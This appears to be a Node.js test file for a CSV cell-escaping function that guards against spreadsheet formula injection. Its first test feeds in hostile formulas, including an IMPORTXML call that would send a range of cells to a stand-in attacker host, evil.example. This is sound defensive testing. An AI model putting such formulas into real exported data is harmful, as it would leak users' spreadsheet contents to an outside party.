import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell } from '../src/server/csvCell';

test('cells a spreadsheet would run as a formula are neutralised', () => {
  assert.equal(csvCell('=HYPERLINK("http://evil.example","x")'), `"'=HYPERLINK(""http://evil.example"",""x"")"`);
  assert.equal(csvCell('=IMPORTXML(CONCAT("http://evil.example/?",A2:A99),"//a")'), `"'=IMPORTXML(CONCAT(""http://evil.example/?"",A2:A99),""//a"")"`);
  assert.equal(csvCell('+1+1'), `"'+1+1"`);
  assert.equal(csvCell('-2+3'), `"'-2+3"`);
  assert.equal(csvCell('@SUM(A1:A9)'), `"'@SUM(A1:A9)"`);
  assert.equal(csvCell('\t=1+1'), `"'\t=1+1"`);
  assert.equal(csvCell('\r=1+1'), `"'\r=1+1"`);
});

test('leading whitespace does not smuggle a formula past the check', () => {
  assert.equal(csvCell('  =1+1'), `"'  =1+1"`);
});

test('ordinary values are quoted and otherwise untouched', () => {
  assert.equal(csvCell('Aarav Jain'), '"Aarav Jain"');
  assert.equal(csvCell('aarav@example.com'), '"aarav@example.com"');
  assert.equal(csvCell('Rs. 1,000.00'), '"Rs. 1,000.00"');
  assert.equal(csvCell(42), '"42"');
});

test('embedded quotes are doubled and empty values stay empty', () => {
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(csvCell(null), '""');
  assert.equal(csvCell(undefined), '""');
});

test('a phone number no longer opens as a broken formula', () => {
  // Excel reads a bare "+91 98765 43210" as an expression and shows an error.
  assert.equal(csvCell('+91 98765 43210'), `"'+91 98765 43210"`);
});
